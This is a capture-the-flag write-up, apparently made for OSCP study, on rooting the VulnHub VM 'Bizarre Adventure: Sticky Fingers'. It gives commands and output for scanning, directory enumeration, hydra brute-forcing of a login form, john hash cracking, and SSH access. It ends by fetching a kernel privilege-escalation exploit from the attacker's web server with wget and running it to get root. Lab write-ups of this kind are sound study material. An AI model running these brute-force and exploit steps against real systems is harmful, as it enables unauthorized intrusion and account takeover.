---
---
#  Bizarre Adventure: Sticky Fingers:

Hello, this is one of my writeups, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/bizarre-adventure-sticky-fingers,560/)) is a nice intermediate level machine.

> I'm not using Kali, or any penTest specific distro. I'm just using my Ubuntu machine. Feel free to use whatever distro you feel comfortable with.


So after you fire up the vm, give it a few minutes to start up all services. Afterwards lets start by scanning the network to identify its IP.
```
netdiscover
```
came up  with the VM's IP : `192.168.1.4`

Lets scan the VM with `nmap` to check what services are exposed.
```
$ nmap -sV 192.168.1.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 09:29 EEST
Nmap scan report for stickyfingers (192.168.1.4)
Host is up (0.0012s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds

```
Lets start by checking out the webserver on port 80 with our browser. Its the default apache page, So lets enumerate it too.

Enumerating with `dirb` returns some interesting results:

```
$ dirb http://192.168.1.4

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Oct  1 09:32:21 2020
URL_BASE: http://192.168.1.4/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.4/ ----
==> DIRECTORY: http://192.168.1.4/admin/                                                               
==> DIRECTORY: http://192.168.1.4/css/                                                                 
==> DIRECTORY: http://192.168.1.4/fonts/                                                               
==> DIRECTORY: http://192.168.1.4/images/                                                              
+ http://192.168.1.4/index.html (CODE:200|SIZE:12685)                                                  
==> DIRECTORY: http://192.168.1.4/js/                                                                  
+ http://192.168.1.4/server-status (CODE:403|SIZE:276)                                                 
==> DIRECTORY: http://192.168.1.4/vendor/                                                              
                                                                                                       
---- Entering directory: http://192.168.1.4/admin/ ----
+ http://192.168.1.4/admin/index.php (CODE:200|SIZE:2643)                                              
                                                                                                       
---- Entering directory: http://192.168.1.4/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.4/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.4/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.4/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                       
---- Entering directory: http://192.168.1.4/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Oct  1 09:32:22 2020
DOWNLOADED: 9224 - FOUND: 3

```

We discover 3 interesting directories:
- admin
- images
- vendor

Lets investigate each one of them closely with our web browser.

The admin page contains a login form, but we need a username, looking into the images directory we find a bunch of images and a flag with a possible username `zipperman` and/or `Bucciarati`. Lets download all images and see if there's anything of value inside them.

To get all the files:
```
wget http://192.168.1.4/images/ -r -np
```

Trying all images with `steghide` returns nothing (except a troll link to a music video), so lets bruteforce the admin page with `hydra` using the usernames found above:
```
$ hydra  -P ../wordlists/rockyou.txt 192.168.1.4 http-post-form '/admin/index.php:username=^USER^&pass=^PASS^:Login Failed' -t 64 -l Zipperman
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-01 13:07:48
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://192.168.1.4:80/admin/index.php:username=^USER^&pass=^PASS^:Login Failed
[STATUS] 16153.00 tries/min, 16153 tries in 00:01h, 14328246 to do in 14:48h, 64 active
[STATUS] 16938.00 tries/min, 50814 tries in 00:03h, 14293585 to do in 14:04h, 64 active
[STATUS] 17244.71 tries/min, 120713 tries in 00:07h, 14223686 to do in 13:45h, 64 active
[STATUS] 17286.93 tries/min, 259304 tries in 00:15h, 14085095 to do in 13:35h, 64 active
[STATUS] 17301.68 tries/min, 536352 tries in 00:31h, 13808047 to do in 13:19h, 64 active
[STATUS] 17299.34 tries/min, 813069 tries in 00:47h, 13531330 to do in 13:03h, 64 active
[80][http-post-form] host: 192.168.1.4   login: Zipperman   password: Password@123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-01 14:08:11
```
After an hour or so, we get a password for Zipperman. This could be our way in.

> Remember to configure `hydra` we need to inspect a failed login request first.

Logging in with the new creds, we find a base64 string alogn some preate neat pirate flags! Lets decode it:
```
$ echo "ODBlNDEzMDQwNzFjYmY1ODU2NTM2ZTM5MGYzYzc3ZjQ0NWE0OGVjMDE3NzQwNzdiOGM2ODNlMzA5YzUzMTMyOQ==" | base64 -d
80e41304071cbf5856536e390f3c77f445a48ec01774077b8c683e309c531329
```

Analyzing the output with `hashid` gives us some probable matches:
```
$ hashid 80e41304071cbf5856536e390f3c77f445a48ec01774077b8c683e309c531329
Analyzing '80e41304071cbf5856536e390f3c77f445a48ec01774077b8c683e309c531329'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
```

Lets use `john` to crack this possible `sha-256` hash:
```
$ echo "80e41304071cbf5856536e390f3c77f445a48ec01774077b8c683e309c531329" > hashToCrack.txt
$ ../john/run/john --format=raw-sha256 hashToCrack.txt --wordlist=../wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1Password1*      (?)
1g 0:00:00:00 DONE (2020-10-01 17:21) 1.020g/s 13374Kp/s 13374Kc/s 13374KC/s 1wrm2cda..191087r
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

It seems we just got a new password to play with. Lets try it with both users on the open `ssh` port

Trying user Zipperman with the new password failed. Same for user Bucciarati. User bucciarati though, gives us a nice shell:
```
$ ssh bucciarati@192.168.1.4
bucciarati@192.168.1.4's password: 
Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

298 packages can be updated.
0 updates are security updates.


Last login: Tue Sep 15 19:40:18 2020 from 10.0.0.7
bucciarati@stickyfingers:~$ 
```
Checking the linux kernel, and then running a search on it with `searchsploit`, gives us some interesting results:
```
bucciarati@stickyfingers:/tmp$ uname -a
Linux stickyfingers 4.10.0-19-generic #21-Ubuntu SMP Thu Apr 6 17:04:57 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

```
$ searchsploit linux kernel 4.10
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalat | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 | linux/local/9479.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlay | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlay | linux/local/37293.txt
Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege E | linux/local/47163.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free   | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation             | linux/local/41886.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of S | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation           | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Esc | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service                      | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak               | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption   | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                         | linux/dos/44579.c
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Lets try with this one `Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Esc | linux/local/45010.c`

We first need to copy the exploit from our host to the victim machine.
Lets navigate to the exploit dir and run a web server:
```
$ cd /opt/exploit-database/exploits/linux/local/
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now lets download the exploit in the victim machine:
```
bucciarati@stickyfingers:~$ cd /tmp
bucciarati@stickyfingers:/tmp$ wget http://192.168.1.10:8000/45010.c
--2020-10-01 11:52:10--  http://192.168.1.10:8000/45010.c
Connecting to 192.168.1.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13728 (13K) [text/plain]
Saving to: ‘45010.c’

45010.c                   100%[=====================================>]  13.41K  --.-KB/s    in 0.05s   

2020-10-01 11:52:10 (259 KB/s) - ‘45010.c’ saved [13728/13728]

bucciarati@stickyfingers:/tmp$ ll
total 56
drwxrwxrwt 10 root       root        4096 Oct  1 11:52 ./
drwxr-xr-x 23 root       root        4096 Sep 13 15:08 ../
-rw-rw-r--  1 bucciarati bucciarati 13728 Sep 19 06:04 45010.c
drwxrwxrwt  2 root       root        4096 Oct  1 03:27 .font-unix/
drwxrwxrwt  2 root       root        4096 Oct  1 03:27 .ICE-unix/
drwx------  3 root       root        4096 Oct  1 03:27 systemd-private-c595672ccb8042ddb0c17fc490a745d1-apache2.service-OFmaz9/
drwx------  3 root       root        4096 Oct  1 03:27 systemd-private-c595672ccb8042ddb0c17fc490a745d1-systemd-resolved.service-epbFzD/
drwx------  3 root       root        4096 Oct  1 03:27 systemd-private-c595672ccb8042ddb0c17fc490a745d1-systemd-timesyncd.service-MnsLXq/
drwxrwxrwt  2 root       root        4096 Oct  1 03:27 .Test-unix/
drwxrwxrwt  2 root       root        4096 Oct  1 03:27 .X11-unix/
drwxrwxrwt  2 root       root        4096 Oct  1 03:27 .XIM-unix/
bucciarati@stickyfingers:/tmp$
```
Lets build it now:
```
bucciarati@stickyfingers:/tmp$ gcc 45010.c -o exploit
bucciarati@stickyfingers:/tmp$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff9274bc5d8600
[*] Leaking sock struct from ffff9274bb945c00
[*] Sock->sk_rcvtimeo at offset 592
[*] Cred structure at ffff9274b621e600
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff9274b621e600
[*] credentials patched, launching shell...
# whoami
root
# 
```
Finally lets get the root flag:
```
# cd /root
# ls -lart
total 36
-rw-r--r--  1 root root     148 Aug 17  2015 .profile
-rw-r--r--  1 root root    3106 Oct 22  2015 .bashrc
drwxr-xr-x 23 root root    4096 Sep 13 15:08 ..
drwxr-xr-x  2 root root    4096 Sep 13 15:37 .nano
drwx------  2 root root    4096 Sep 14 16:26 .ssh
-rw-------  1 root root     724 Sep 14 16:34 .bash_history
drwx------  2 root root    4096 Sep 14 20:37 .cache
-rwx------  1 root apache2 1008 Sep 14 20:38 flag.txt.txt
-rw-r--r--  1 root root       0 Sep 14 20:38 .flag.txt.txt.swp
drwx------  5 root root    4096 Sep 14 20:38 .
# cat flag.txt.txt
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"

FLAG{JoJ0sZ_B1Z4RrR3_AddV3nT9R3_}

create by Joas Antonio
Linkedin:https://bit.ly/3ki1WBE
# 
```

### I hope that you enjoyed this VM as much as I did.

